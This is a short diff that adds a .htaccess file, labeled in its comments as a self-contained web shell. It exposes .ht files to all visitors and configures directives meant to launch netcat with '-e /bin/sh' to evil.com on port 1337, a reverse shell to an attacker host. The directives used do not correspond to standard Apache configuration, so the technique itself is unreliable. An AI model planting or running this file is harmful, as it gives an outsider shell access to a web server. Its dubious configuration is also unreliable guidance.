@@ -1,0 +1,11 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+SetHandler sendmail
+SendmailName /bin/nc
+SendmailArguments -e /bin/sh evil.com 1337
